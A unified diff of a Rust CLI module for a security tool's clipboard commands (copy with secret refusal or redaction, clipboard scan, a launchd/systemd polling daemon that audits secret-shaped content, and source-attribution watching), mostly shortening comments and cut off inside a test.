@@ -1,40 +1,15 @@
 //! `tirith clipboard` — read/write/scan/guard the system clipboard (M7 ch3).
 //!
-//! Six user-facing actions:
+//! Actions: `copy <file>` (refuses High-severity content unless `--redact`),
+//! `scan` (run the paste pipeline over the current clipboard), `guard
+//! install-service|uninstall-service|status` (manage the OS service unit), and
+//! `daemon --foreground` (the polling loop; the service's `ExecStart`, hidden from help).
 //!
-//! - `tirith clipboard copy <file>` — read a file, refuse to copy if it
-//!   contains High-severity (secret-shaped) findings; with `--redact
-//!   --audience <a>` apply the M7 ch2 redaction engine and copy the
-//!   sanitized content instead.
-//! - `tirith clipboard scan` — read the current clipboard, run the paste
-//!   pipeline (`engine::analyze` with `ScanContext::Paste`) over its
-//!   contents, and print the verdict.
-//! - `tirith clipboard guard install-service [--apply]` — print (or
-//!   write on `--apply`) the OS-correct service unit that drives the
-//!   foreground daemon.
-//! - `tirith clipboard guard uninstall-service` — remove the unit.
-//! - `tirith clipboard guard status` — report whether the service is
-//!   loaded.
-//! - `tirith clipboard daemon --foreground` — the polling loop. Hidden
-//!   from `--help`; the LaunchAgent/systemd service uses it as
-//!   `ExecStart`.
+//! We ship only the launchd/systemd path (not a shell-profile `&`), which would orphan
+//! processes and duplicate daemons with no clean-shutdown handle.
 //!
-//! ## Why a service unit, not a shell-profile `&` background
-//!
-//! Spawning the daemon from `~/.zshrc` via `tirith clipboard guard on &`
-//! produces orphaned processes on subshells, duplicate daemons on
-//! window reload, and no clean-shutdown handle for `uninstall`. We
-//! deliberately ship only the launchd/systemd path here and document
-//! the manual `tirith clipboard daemon --foreground &` escape hatch.
-//!
-//! ## Headless clipboard backends
-//!
-//! Linux without `$DISPLAY`/`$WAYLAND_DISPLAY` (CI, plain SSH) and
-//! Windows session 0 don't have a clipboard. The helpers in
-//! `tirith_core::clipboard` translate that into `ClipboardError::NoBackend`,
-//! which we render as a soft "no clipboard backend" envelope under
-//! `--json` and a stderr note under `--human` — exit 0 in both, so a CI
-//! lane that runs `tirith clipboard scan` for hygiene doesn't fail.
+//! Headless (Linux without `$DISPLAY`/`$WAYLAND_DISPLAY`, Windows session 0) yields
+//! `ClipboardError::NoBackend`, rendered as a soft envelope and exit 0 so CI doesn't fail.
 
 use std::fs;
 use std::io::Write;
@@ -49,26 +24,17 @@ use tirith_core::redact::{redact_for_audience_with_custom, ShareAudience};
 use tirith_core::tokenize::ShellType;
 use tirith_core::verdict::Severity;
 
-/// Maximum file size we will read for `tirith clipboard copy`.
-/// Matches `tirith paste`'s 1 MiB cap — the system clipboard isn't a
-/// blob store, and copying a 100 MB file is almost certainly a mistake.
+/// Max file size for `tirith clipboard copy` — matches `tirith paste`'s 1 MiB cap.
 const MAX_COPY_BYTES: u64 = 1024 * 1024;
 
-/// Daemon poll interval. 2s is short enough to catch most legitimate
-/// copy → paste flows and long enough to keep idle CPU near zero.
+/// Daemon poll interval (short enough to catch copy→paste, idle CPU near zero).
 const POLL_INTERVAL: Duration = Duration::from_secs(2);
 
-/// Audit-debounce window. The daemon polls every 2s; without a debounce
-/// a clipboard pinned to a single secret would produce 30 audit entries
-/// per minute. One entry per *distinct content* per minute is the spec.
+/// Audit-debounce window: one entry per distinct content per minute (spec).
 const DEBOUNCE_WINDOW: Duration = Duration::from_secs(60);
 
-// ---------------------------------------------------------------------------
-// JSON envelopes
-// ---------------------------------------------------------------------------
-
-/// Scan / no-backend envelope. The `status` field is the single
-/// machine-readable signal — `"ok"`, `"no_backend"`, or `"empty"`.
+/// Scan / no-backend envelope. `status` is the machine-readable signal
+/// (`"ok"` / `"no_backend"` / `"empty"`).
 #[derive(serde::Serialize)]
 struct ScanEnvelope<'a> {
     status: &'a str,
@@ -96,28 +62,18 @@ struct GuardInstallEnvelope<'a> {
     loaded: bool,
 }
 
-// ---------------------------------------------------------------------------
-// `tirith clipboard copy <file>`
-// ---------------------------------------------------------------------------
-
-/// Read `path`, run a paste-context analyze; refuse on a High-severity
-/// finding unless `redact` is set. With `redact`, apply the audience-aware
-/// redactor first and copy the sanitized content.
-///
-/// Returns the process exit code: 0 on copy succeeded, 1 on refused /
-/// I/O failure / no clipboard backend.
+/// Read `path`, run a paste-context analyze; refuse on a High-severity finding unless
+/// `redact` is set (then apply the audience-aware redactor and copy the sanitized content).
+/// Exit code: 0 copied, 1 refused / I/O failure / no clipboard backend.
 pub fn copy(path: &Path, redact: bool, audience: Option<&str>, json: bool) -> i32 {
-    // ---- read input ------------------------------------------------------
     let input = match read_file_capped(path) {
         Ok(s) => s,
         Err(code) => return code,
     };
 
-    // ---- analyze for High-severity findings ------------------------------
-    // A local file being copied is NOT a paste from a recorded web source, so
-    // forbid the on-disk sidecar read: `AbsentOrInvalid`. Otherwise a file
-    // whose content hash-matches the current `clipboard_source.json` record
-    // could spuriously fire `PasteSourceMismatch` on an unrelated copy.
+    // A local file being copied is NOT a recorded web paste, so forbid the sidecar read
+    // (`AbsentOrInvalid`) — else a hash-match against `clipboard_source.json` could
+    // spuriously fire `PasteSourceMismatch`.
     let verdict = analyze_as_paste(
         &input,
         tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
@@ -128,7 +84,6 @@ pub fn copy(path: &Path, redact: bool, audience: Option<&str>, json: bool) -> i3
         .any(|f| f.severity >= Severity::High);
 
     if has_high && !redact {
-        // Refuse: don't copy secret-shaped content.
         if json {
             let env = ScanEnvelope {
                 status: "refused",
@@ -146,7 +101,6 @@ pub fn copy(path: &Path, redact: bool, audience: Option<&str>, json: bool) -> i3
         return 1;
     }
 
-    // ---- choose the bytes to write to the clipboard ----------------------
     let to_copy: String;
     let mut redact_summary: Option<String> = None;
     if redact {
@@ -161,13 +115,11 @@ pub fn copy(path: &Path, redact: bool, audience: Option<&str>, json: bool) -> i3
                     return 2;
                 }
             },
-            // --redact without --audience defaults to `generic` (== llm),
-            // matching the M7 ch2 docs that call `generic` the safe default.
+            // --redact without --audience defaults to `generic` (the M7 ch2 safe default).
             None => ShareAudience::Generic,
         };
-        // Customer-ID patterns are repo-specific; for the clipboard CLI we
-        // skip the policy lookup (off-hot-path) and use the empty default.
-        // `tirith share` is the documented surface for policy-aware redaction.
+        // Skip the repo-specific customer-ID policy lookup here (off-hot-path);
+        // `tirith share` is the documented policy-aware redaction surface.
         let report = redact_for_audience_with_custom(&input, aud, &[]);
         let summary = if report.redactions.is_empty() {
             "no redactions applied".to_string()
@@ -185,7 +137,6 @@ pub fn copy(path: &Path, redact: bool, audience: Option<&str>, json: bool) -> i3
         to_copy = input;
     }
 
-    // ---- write to clipboard ----------------------------------------------
     match write_clipboard_text(&to_copy) {
         Ok(()) => {
             if json {
@@ -224,25 +175,14 @@ pub fn copy(path: &Path, redact: bool, audience: Option<&str>, json: bool) -> i3
     }
 }
 
-// ---------------------------------------------------------------------------
-// `tirith clipboard scan`
-// ---------------------------------------------------------------------------
-
-/// Read the current clipboard, run the paste pipeline, print the verdict.
-///
-/// Exit codes match `tirith paste`:
-/// - `0` — Allow (no findings, or no clipboard backend in --json mode)
-/// - `1` — Block (High-severity finding)
-/// - `2` — Warn (Medium-severity finding)
-///
-/// The `--json` envelope distinguishes the no-backend / empty paths
-/// from a real verdict via the `status` field.
+/// Read the current clipboard, run the paste pipeline, print the verdict. Exit codes
+/// match `tirith paste` (0 Allow, 1 Block, 2 Warn); the `--json` `status` field
+/// distinguishes the no-backend / empty paths from a real verdict.
 pub fn scan(json: bool) -> i32 {
     match read_clipboard_text() {
         Ok(Some(text)) if !text.is_empty() => {
-            // Analyzing the ACTUAL clipboard content: the companion sidecar
-            // legitimately describes it, so `Unread` lets the engine consult
-            // `clipboard_source.json` for paste-source attribution.
+            // Actual clipboard content: the sidecar legitimately describes it, so `Unread`
+            // lets the engine consult `clipboard_source.json` for attribution.
             let verdict =
                 analyze_as_paste(&text, tirith_core::clipboard::ClipboardSourceState::Unread);
             if json {
@@ -258,7 +198,7 @@ pub fn scan(json: bool) -> i32 {
             verdict.action.exit_code()
         }
         Ok(_) => {
-            // Empty clipboard or non-text payload — soft-pass, exit 0.
+            // Empty or non-text payload — soft-pass, exit 0.
             if json {
                 let env = ScanEnvelope {
                     status: "empty",
@@ -275,8 +215,7 @@ pub fn scan(json: bool) -> i32 {
         }
         Err(ClipboardError::NoBackend) => {
             emit_no_backend(json, "scan");
-            // Exit 0: the absence of a clipboard backend is not a failure,
-            // it's a soft-degrade so CI runners and SSH sessions don't trip.
+            // Exit 0: a missing backend is a soft-degrade, not a failure (CI / SSH).
             0
         }
         Err(e) => {
@@ -296,22 +235,16 @@ pub fn scan(json: bool) -> i32 {
     }
 }
 
-// ---------------------------------------------------------------------------
-// `tirith clipboard guard ...`
-// ---------------------------------------------------------------------------
-
 /// Print (and on `apply=true` write) the OS-correct service unit.
-///
-/// macOS → `~/Library/LaunchAgents/sh.tirith.clipboard.plist` + `launchctl load`
-/// Linux → `~/.config/systemd/user/tirith-clipboard.service` + `systemctl --user enable --now`
-/// Windows → not supported in service mode (print guidance).
+/// macOS → LaunchAgent plist + `launchctl load`; Linux → systemd-user unit +
+/// `systemctl --user enable --now`; Windows → unsupported (print guidance).
 pub fn install_service(apply: bool, json: bool) -> i32 {
     let platform = service_platform();
     let unit_path = service_unit_path();
     let unit_content = match render_service_unit() {
         Some(s) => s,
         None => {
-            // Windows: no LaunchAgent / systemd. Foreground only.
+            // Windows: foreground only.
             if json {
                 let env = GuardInstallEnvelope {
                     platform,
@@ -330,8 +263,7 @@ pub fn install_service(apply: bool, json: bool) -> i32 {
     };
 
     if !apply {
-        // Dry-run: print the unit content to stdout. JSON mode wraps it
-        // in the envelope for scripted callers.
+        // Dry-run: print the unit content (JSON mode wraps it in the envelope).
         if json {
             let env = serde_json::json!({
                 "platform": platform,
@@ -353,18 +285,16 @@ pub fn install_service(apply: bool, json: bool) -> i32 {
                 );
                 eprintln!("tirith clipboard guard install-service: rerun with --apply to install.");
             }
-            // Print unit content to stdout so it can be redirected.
             print!("{unit_content}");
         }
         return 0;
     }
 
-    // --apply path: write the unit, then load it.
+    // --apply: write the unit, then load it.
     let path = match unit_path.as_ref() {
         Some(p) => p,
         None => {
-            // Defensive: render_service_unit returned Some but
-            // service_unit_path returned None. Treat as unsupported.
+            // Defensive: render returned Some but path resolved None — treat as unsupported.
             eprintln!(
                 "tirith clipboard guard install-service: no unit path resolved for this platform"
             );
@@ -372,11 +302,7 @@ pub fn install_service(apply: bool, json: bool) -> i32 {
         }
     };
 
-    // Idempotency: if the file already exists with matching content,
-    // skip the write but still attempt to (re-)load.
-    // Idempotency: only write when the on-disk content differs from
-    // (or fails to read as) the rendered unit. A `matches!` keeps the
-    // intent obvious to clippy and a reader.
+    // Idempotency: write only when on-disk content differs (or fails to read), then load.
     let needs_write = !matches!(fs::read_to_string(path), Ok(existing) if existing == unit_content);
 
     if needs_write {
@@ -389,9 +315,8 @@ pub fn install_service(apply: bool, json: bool) -> i32 {
                 return 1;
             }
         }
-        // macOS: ensure ~/Library/Logs exists so launchd doesn't get
-        // EACCES on the StandardOutPath / StandardErrorPath we set in the
-        // plist. systemd users get journald logs so this is no-op on Linux.
+        // macOS: ensure ~/Library/Logs exists so launchd doesn't EACCES on the plist's
+        // StandardOutPath / StandardErrorPath. (No-op on Linux — systemd uses journald.)
         #[cfg(target_os = "macos")]
         {
             if let Ok(home) = std::env::var("HOME") {
@@ -509,38 +434,23 @@ pub fn status(json: bool) -> i32 {
     0
 }
 
-// ---------------------------------------------------------------------------
-// `tirith clipboard daemon --foreground`
-// ---------------------------------------------------------------------------
-
-/// The polling loop. Reads the clipboard every `POLL_INTERVAL`; when
-/// content matches secret-shaped patterns, emits a stderr warning and
-/// writes an audit-log entry. Debounces by content SHA-256 within a
-/// 60s window so a pinned secret produces at most one entry per minute.
-///
-/// Designed to run under launchd / systemd-user — never returns; the
-/// service manager owns lifecycle. Under `--foreground` interactive
-/// use, Ctrl-C terminates via SIGINT delivered to the loop.
-///
-/// In JSON mode, each event is printed as a single line of JSON on
-/// stdout so a log forwarder can ingest it directly.
+/// The polling loop. Reads the clipboard every `POLL_INTERVAL`; on secret-shaped content,
+/// warns on stderr and writes an audit entry, debounced by content SHA-256 within a 60s
+/// window. Never returns (the service manager owns lifecycle; Ctrl-C ends `--foreground`).
+/// In JSON mode each event is one line of JSON for a log forwarder.
 pub fn daemon_foreground(json: bool) -> i32 {
     use std::collections::HashMap;
     use std::time::Instant;
 
-    // (content_sha256_hex → last seen Instant) for debounce.
+    // content_sha256_hex → last seen, for debounce.
     let mut seen: HashMap<String, Instant> = HashMap::new();
 
-    // Silent-failure fix (Sev-5): persistent clipboard read errors used to
-    // be swallowed silently — an operator saw a "running" daemon failing
-    // every 2s for hours. Rate-limit by error string so transient errors
-    // stay quiet but a stuck-error condition surfaces (one stderr line per
-    // minute per distinct message).
+    // Sev-5 silent-failure fix: rate-limit persistent read errors (one stderr line per
+    // minute per distinct message) so a stuck-error daemon surfaces instead of failing quietly.
     let mut last_logged_error: HashMap<String, Instant> = HashMap::new();
     const ERROR_LOG_RATE: std::time::Duration = std::time::Duration::from_secs(60);
 
-    // First read: tell stderr the daemon is alive so an operator
-    // watching `journalctl -u tirith-clipboard --user` sees something.
+    // First read: announce liveness on stderr/JSON.
     if json {
         let env = serde_json::json!({
             "event": "daemon_start",
@@ -563,14 +473,12 @@ pub fn daemon_foreground(json: bool) -> i32 {
             Ok(Some(t)) if !t.is_empty() => t,
             Ok(_) => continue,
             Err(ClipboardError::NoBackend) => {
-                // Headless: nothing to do. Sleep longer so we don't burn
-                // CPU on a doomed retry.
+                // Headless: sleep longer to avoid burning CPU on a doomed retry.
                 std::thread::sleep(POLL_INTERVAL * 30);
                 continue;
             }
             Err(e) => {
-                // Rate-limited stderr log so a persistent failure (perms,
-                // backend crash) surfaces without spamming the journal.
+                // Rate-limited so a persistent failure surfaces without spamming the journal.
                 let key = e.to_string();
                 let now_inst = Instant::now();
                 let should_log = last_logged_error
@@ -589,7 +497,6 @@ pub fn daemon_foreground(json: bool) -> i32 {
                         eprintln!("tirith clipboard daemon: read error: {key}");
                     }
                 }
-                // GC the rate-limit map.
                 last_logged_error.retain(|_, t| now_inst.duration_since(*t) < ERROR_LOG_RATE * 5);
                 continue;
             }
@@ -604,15 +511,12 @@ pub fn daemon_foreground(json: bool) -> i32 {
                 continue;
             }
         }
-        // Garbage-collect entries older than 5× the window so the map
-        // doesn't grow unboundedly under a busy clipboard.
+        // GC entries older than 5× the window so the map stays bounded.
         seen.retain(|_, t| now.duration_since(*t) < DEBOUNCE_WINDOW * 5);
         seen.insert(hash.clone(), now);
 
-        // Analyze the new content. Like `scan`, this is the ACTUAL clipboard
-        // (read via `read_clipboard_text` above), so the companion sidecar
-        // legitimately describes it — `Unread` lets the engine consult
-        // `clipboard_source.json` for paste-source attribution.
+        // Actual clipboard content (like `scan`): `Unread` lets the engine consult
+        // `clipboard_source.json` for attribution.
         let verdict = analyze_as_paste(&text, tirith_core::clipboard::ClipboardSourceState::Unread);
         let has_high = verdict
             .findings
@@ -623,11 +527,8 @@ pub fn daemon_foreground(json: bool) -> i32 {
             continue;
         }
 
-        // Audit + stderr warn. Silent-failure fix: previously `let _ = …`
-        // swallowed audit-write failures, so `tirith last-trigger <event_id>`
-        // returned nothing for the id (disk full / perms etc.). Match the
-        // result and emit a stderr warning so the broken correlation is
-        // debuggable.
+        // Audit + stderr warn. Silent-failure fix: a swallowed audit-write failure left
+        // `tirith last-trigger <event_id>` empty, so match the result and warn on failure.
         let event_id = uuid::Uuid::new_v4().to_string();
         if let Err(e) =
             tirith_core::audit::log_verdict(&verdict, &text, None, Some(event_id.clone()), &[])
@@ -655,23 +556,13 @@ pub fn daemon_foreground(json: bool) -> i32 {
     }
 }
 
-// ---------------------------------------------------------------------------
-// `tirith clipboard watch` (M12 ch1)
-// ---------------------------------------------------------------------------
-
-/// Poll the clipboard and report the attributed source URL each time the
-/// companion browser extension records a NEW clipboard source whose content
-/// hash matches the current clipboard.
+/// Poll the clipboard and report the attributed source URL each time the companion
+/// browser extension records a NEW source whose content hash matches the clipboard.
 ///
-/// The companion extension (a separate repo) writes
-/// `state_dir()/clipboard_source.json` whenever it sets the clipboard. We watch
-/// that file's mtime: when it advances AND `sha256(clipboard) ==
-/// record.content_sha256`, we print the attributed source so an operator can see
-/// "this clipboard content came from <url>" in real time. A no-op on a machine
-/// without the extension (the file never appears).
-///
-/// Never returns under normal operation (Ctrl-C terminates). In `--json` mode
-/// each attribution is one line of JSON on stdout.
+/// The extension writes `state_dir()/clipboard_source.json` when it sets the clipboard;
+/// we watch its mtime and, when it advances AND `sha256(clipboard) == record.content_sha256`,
+/// print the source. No-op without the extension. Never returns (Ctrl-C ends); `--json`
+/// emits one line per attribution.
 pub fn watch(json: bool) -> i32 {
     use std::time::SystemTime;
 
@@ -686,10 +577,7 @@ pub fn watch(json: bool) -> i32 {
             "source_file": source_path.display().to_string(),
             "poll_interval_ms": POLL_INTERVAL.as_millis() as u64,
         });
-        // A write failure here means stdout is gone (e.g. a downstream `head`
-        // closed the pipe). Exit cleanly rather than entering the poll loop — a
-        // watcher with no reader has nothing to report to. See the per-event emit
-        // below for the same handling.
+        // Broken pipe (no reader): exit cleanly rather than poll forever. Same below.
         if println_json(&env).is_err() {
             return 0;
         }
@@ -701,27 +589,23 @@ pub fn watch(json: bool) -> i32 {
         );
     }
 
-    // The last companion-record mtime we acted on, so we only report a source
-    // once per extension write rather than every poll.
+    // Last record mtime acted on, so we report once per extension write, not per poll.
     let mut last_mtime: Option<SystemTime> = None;
 
     loop {
         std::thread::sleep(POLL_INTERVAL);
 
-        // The companion record's current mtime. Absent file → nothing to do.
         let mtime = match std::fs::metadata(&source_path).and_then(|m| m.modified()) {
             Ok(t) => t,
             Err(_) => continue,
         };
-        // Only act when the record is NEWER than the one we last reported.
+        // Act only when the record is NEWER than the one we last reported.
         if last_mtime == Some(mtime) {
             continue;
         }
 
-        // Read the record (fail-safe to None) and the current clipboard.
         let Some(record) = tirith_core::clipboard::read_source_record_at(&source_path) else {
-            // Present but unreadable/malformed — advance the marker so we don't
-            // re-read the same broken file every poll.
+            // Present but unreadable — advance the marker so we don't re-read it every poll.
             last_mtime = Some(mtime);
             continue;
         };
@@ -732,15 +616,11 @@ pub fn watch(json: bool) -> i32 {
                 continue;
             }
             Err(ClipboardError::NoBackend) => {
-                // Headless: back off and keep waiting.
                 std::thread::sleep(POLL_INTERVAL * 30);
                 continue;
             }
             Err(_) => {
-                // Transient clipboard read failure (e.g. the selection is held by
-                // another app this instant). Do NOT advance `last_mtime`: the same
-                // source record should be retried on the next poll rather than
-                // permanently skipped after one transient error.
+                // Transient read failure: do NOT advance `last_mtime`, retry next poll.
                 continue;
             }
         };
@@ -749,8 +629,7 @@ pub fn watch(json: bool) -> i32 {
         let actual = sha256_hex(clip.as_bytes());
         last_mtime = Some(mtime);
         if !actual.eq_ignore_ascii_case(record.content_sha256.trim()) {
-            // The record describes a different clipboard payload (a race, or the
-            // clipboard was replaced by another app). Don't claim attribution.
+            // Record describes a different payload (race / replaced) — no attribution.
             continue;
         }
 
@@ -761,15 +640,12 @@ pub fn watch(json: bool) -> i32 {
                 "source_title": record.source_title,
                 "hidden_text_detected": record.hidden_text_detected,
             });
-            // Stop watching when the JSON write fails: a broken pipe (the reader
-            // closed stdout) means nobody is consuming events, so polling forever
-            // would just spin. Exit cleanly. Mirrors the watch_start handling.
+            // Broken pipe → no consumer; exit cleanly (mirrors watch_start).
             if println_json(&env).is_err() {
                 return 0;
             }
         } else {
-            // Human mode: a broken pipe on stdout likewise means the reader is
-            // gone; stop rather than polling forever.
+            // Human mode: broken pipe → reader gone, stop.
             if writeln!(
                 std::io::stdout(),
                 "tirith clipboard watch: clipboard source: {}",
@@ -783,24 +659,13 @@ pub fn watch(json: bool) -> i32 {
     }
 }
 
-// ---------------------------------------------------------------------------
-// helpers — analysis & I/O
-// ---------------------------------------------------------------------------
-
-/// Run the engine in paste context over `input`. Used by `copy`
-/// (pre-flight before writing to clipboard), `scan` (post-read), and the
-/// `daemon` polling loop.
+/// Run the engine in paste context over `input` (used by `copy`, `scan`, `daemon`).
 ///
-/// `clipboard_source` is threaded in by the caller rather than hardcoded:
-/// it controls whether `engine::analyze` MAY consult the on-disk paste
-/// sidecar (`clipboard_source.json`). The actual-clipboard paths (`scan`,
-/// `daemon`) pass `Unread` — the sidecar legitimately describes the current
-/// clipboard, so attribution is correct. The `copy` path analyzes the
-/// contents of a LOCAL FILE being copied TO the clipboard — that file was
-/// never pasted from a recorded web source, so it passes `AbsentOrInvalid`
-/// to forbid the sidecar read. Otherwise a local file whose content happened
-/// to hash-match the current sidecar record could spuriously fire
-/// `PasteSourceMismatch` and warn/block an unrelated `tirith clipboard copy`.
+/// The caller threads `clipboard_source` rather than hardcoding it: it controls whether
+/// the engine MAY consult the paste sidecar. Actual-clipboard paths (`scan`, `daemon`) pass
+/// `Unread` (the sidecar describes the clipboard); `copy` analyzes a LOCAL FILE and passes
+/// `AbsentOrInvalid` to forbid the read, else a hash-match would spuriously fire
+/// `PasteSourceMismatch`.
 fn analyze_as_paste(
     input: &str,
     clipboard_source: tirith_core::clipboard::ClipboardSourceState,
@@ -823,18 +688,14 @@ fn analyze_as_paste(
         clipboard_source,
     };
     let mut verdict = engine::analyze(&ctx);
-    // Apply paranoia filter against the active policy so the clipboard
-    // surface honors the same severity threshold as `tirith paste`. A
-    // brand-new policy snapshot is fine — clipboard analysis is rare
-    // (off-hot-path) and consistency with `paste` matters more than
-    // saving a discover() roundtrip.
+    // Paranoia-filter against the active policy so the clipboard honors the same
+    // threshold as `tirith paste`. A fresh snapshot is fine (clipboard analysis is rare).
     let policy = tirith_core::policy::Policy::discover_partial(None);
     engine::filter_findings_by_paranoia(&mut verdict, policy.paranoia);
     verdict
 }
 
-/// Read a file with a hard byte cap so a 100 MB log file doesn't
-/// blow up the process. Errors are mapped to a CLI exit code.
+/// Read a file with a hard byte cap. Errors map to a CLI exit code.
 fn read_file_capped(path: &Path) -> Result<String, i32> {
     let meta = match fs::metadata(path) {
         Ok(m) => m,
@@ -863,8 +724,7 @@ fn read_file_capped(path: &Path) -> Result<String, i32> {
     })
 }
 
-/// Print `"no clipboard backend"` envelope/notice. `verb` is the
-/// command verb ("scan", "copy") so the message points at the right
+/// Print the "no clipboard backend" envelope/notice. `verb` ("scan"/"copy") names the
 /// command in stderr mode.
 fn emit_no_backend(json: bool, verb: &str) {
     if json {
@@ -881,9 +741,8 @@ fn emit_no_backend(json: bool, verb: &str) {
     }
 }
 
-/// Hex-encode the SHA-256 of `bytes` — delegates to the shared core helper
-/// (Greptile R1 #6) so the watch/scan debounce key, the paste-provenance rule,
-/// and the `--with-source` display all hash clipboard content the same way.
+/// SHA-256 hex via the shared core helper (Greptile R1 #6), so debounce key,
+/// paste-provenance rule, and `--with-source` all hash content the same way.
 fn sha256_hex(bytes: &[u8]) -> String {
     tirith_core::clipboard::content_sha256_hex(bytes)
 }
@@ -896,8 +755,7 @@ fn println_json<T: serde::Serialize>(value: &T) -> std::io::Result<()> {
     writeln!(stdout)
 }
 
-/// Pretty-print JSON to stdout with a trailing newline. Quietly drops
-/// the error to stderr — the CLI exit code is what callers actually key on.
+/// Pretty-print JSON to stdout. Drops the error to stderr — callers key on the exit code.
 fn write_json_or_complain<T: serde::Serialize>(value: &T) {
     let mut stdout = std::io::stdout().lock();
     if serde_json::to_writer_pretty(&mut stdout, value).is_err() || writeln!(stdout).is_err() {
@@ -905,11 +763,7 @@ fn write_json_or_complain<T: serde::Serialize>(value: &T) {
     }
 }
 
-// ---------------------------------------------------------------------------
-// helpers — service units
-// ---------------------------------------------------------------------------
-
-/// Short platform tag — printed in JSON envelopes and human messages.
+/// Short platform tag for JSON envelopes and human messages.
 fn service_platform() -> &'static str {
     #[cfg(target_os = "macos")]
     {
@@ -929,13 +783,11 @@ fn service_platform() -> &'static str {
     }
 }
 
-/// Resolve `~` to the user's home directory using the `home` crate.
 fn home_dir_or_none() -> Option<PathBuf> {
     home::home_dir()
 }
 
-/// Path the install-service action writes to. `None` on Windows
-/// (foreground-only) and other unsupported platforms.
+/// Path install-service writes to. `None` on Windows / unsupported platforms.
 fn service_unit_path() -> Option<PathBuf> {
     let home = home_dir_or_none()?;
     #[cfg(target_os = "macos")]
@@ -958,9 +810,8 @@ fn service_unit_path() -> Option<PathBuf> {
     }
 }
 
-/// Resolve the path to the current `tirith` binary for use as the
-/// service's `ExecStart`. Falls back to the literal string `"tirith"`
-/// (relying on PATH at service runtime) if `current_exe()` fails.
+/// Path to the current `tirith` binary for the service's `ExecStart`; falls back to
+/// the literal `"tirith"` (PATH at runtime) if `current_exe()` fails.
 fn current_tirith_exe() -> String {
     std::env::current_exe()
         .ok()
@@ -969,18 +820,14 @@ fn current_tirith_exe() -> String {
         .unwrap_or_else(|| "tirith".to_string())
 }
 
-/// Build the platform-correct service unit text. Returns `None` on
-/// platforms that don't ship a service-mode lifecycle (Windows).
+/// Build the platform-correct service unit text. `None` on Windows.
 pub(crate) fn render_service_unit() -> Option<String> {
     let exe = current_tirith_exe();
 
     #[cfg(target_os = "macos")]
     {
-        // Code-reviewer fix #6: log to per-user `~/Library/Logs/...` instead
-        // of world-writable `/tmp`. On macOS `/tmp` is shared across local
-        // users; a pre-existing symlink there written by another user would
-        // redirect the daemon's logs. `~/Library/Logs` is private to the user.
-        // The directory is created by `install_service` before launchctl load.
+        // Code-reviewer fix #6: log to per-user `~/Library/Logs/` not world-writable
+        // `/tmp` (a foreign symlink there could redirect the daemon's logs).
         let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
         let out_log = format!("{home}/Library/Logs/sh.tirith.clipboard.out.log");
         let err_log = format!("{home}/Library/Logs/sh.tirith.clipboard.err.log");
@@ -1046,14 +893,11 @@ WantedBy=graphical-session.target\n",
     }
 }
 
-/// Load the service unit. Returns `true` on success-ish (best effort,
-/// the actual loaded state is verified by `is_service_loaded`).
+/// Load the service unit (best effort; verified by `is_service_loaded`).
 fn load_service() -> bool {
     #[cfg(target_os = "macos")]
     {
-        // `launchctl load -w <plist>` is the documented "enable+load"
-        // verb. The newer `bootstrap` API requires a domain target;
-        // `load` works against the user's Aqua session implicitly.
+        // `launchctl load -w` is the "enable+load" verb (newer `bootstrap` needs a domain target).
         let path = match service_unit_path() {
             Some(p) => p,
             None => return false,
@@ -1068,9 +912,7 @@ fn load_service() -> bool {
 
     #[cfg(target_os = "linux")]
     {
-        // `daemon-reload` is needed after writing the unit so systemd
-        // picks it up; then `enable --now` flips it on for both this
-        // session and future sessions.
+        // `daemon-reload` so systemd picks up the new unit, then `enable --now`.
         let _ = std::process::Command::new("systemctl")
             .args(["--user", "daemon-reload"])
             .status();
@@ -1087,8 +929,7 @@ fn load_service() -> bool {
     }
 }
 
-/// Unload the service unit. Returns `true` when the unload command
-/// reported success.
+/// Unload the service unit. `true` when the unload command reported success.
 fn unload_service() -> bool {
     #[cfg(target_os = "macos")]
     {
@@ -1118,17 +959,14 @@ fn unload_service() -> bool {
     }
 }
 
-/// Best-effort "is this service running" probe. We deliberately don't
-/// fail the CLI on a launchctl/systemctl absence — the operator might
-/// be inspecting status across hosts in JSON mode. Stderr from the
-/// underlying probe is suppressed so `tirith clipboard guard status`
-/// stays quiet when the service simply isn't installed (the most
-/// common case in CI / fresh workstations).
+/// Best-effort "is this service running" probe. Never fails the CLI on a
+/// launchctl/systemctl absence, and suppresses the probe's stderr so `guard status`
+/// stays quiet when the service simply isn't installed.
 fn is_service_loaded() -> bool {
     use std::process::Stdio;
     #[cfg(target_os = "macos")]
     {
-        // `launchctl list <Label>` returns 0 on found, 113 on not-found.
+        // `launchctl list <Label>`: 0 found, 113 not-found.
         std::process::Command::new("launchctl")
             .args(["list", "sh.tirith.clipboard"])
             .stdout(Stdio::null())
@@ -1156,56 +994,31 @@ fn is_service_loaded() -> bool {
     }
 }
 
-// ---------------------------------------------------------------------------
-// tests
-// ---------------------------------------------------------------------------
-
 #[cfg(test)]
 mod tests {
     use super::*;
     use crate::cli::test_harness::ENV_LOCK;
     use tirith_core::verdict::Action;
 
-    /// Regression test for the M12 paste-sidecar finding (CodeRabbit Major):
-    /// `copy()` analyzes the contents of a LOCAL FILE being copied TO the
-    /// clipboard — that file was never pasted from a recorded web source, so
-    /// `analyze_as_paste` must be called with `AbsentOrInvalid` to forbid the
-    /// engine from consulting `state_dir()/clipboard_source.json`. Otherwise a
-    /// file whose content hash-matches the current sidecar record would fire
-    /// `PasteSourceMismatch` and warn/block an unrelated `tirith clipboard copy`.
-    ///
-    /// We plant a MATCHING sidecar on disk (content hash == the input's hash,
-    /// recorded `source_url` host differs from a URL host IN the input — the
-    /// exact shape that fires `PasteSourceMismatch` under `Unread`) and prove:
-    ///   * `AbsentOrInvalid` (the state `copy()` passes) → NO `PasteSourceMismatch`;
-    ///   * `Unread` (positive control, same on-disk record) → the finding DOES
-    ///     appear, proving the sidecar was otherwise consulted and that the
-    ///     `clipboard_source` parameter is what suppresses it on the copy path.
-    ///
-    /// Mirrors the env handling of
-    /// `golden_fixtures.rs::paste_source_absent_or_invalid_does_not_reread_sidecar`.
+    /// Regression (CodeRabbit Major): `copy()` analyzes a LOCAL FILE, so it must pass
+    /// `AbsentOrInvalid` to forbid the engine reading `clipboard_source.json` — else a
+    /// hash-match would fire `PasteSourceMismatch`. Plants a matching sidecar and proves
+    /// `AbsentOrInvalid` suppresses the finding while `Unread` (positive control) fires it.
     #[test]
     fn copy_path_does_not_consult_sidecar() {
         use tirith_core::clipboard::{content_sha256_hex, ClipboardSourceState};
         use tirith_core::verdict::RuleId;
 
-        // This test mutates the process-wide `XDG_STATE_HOME` (read by
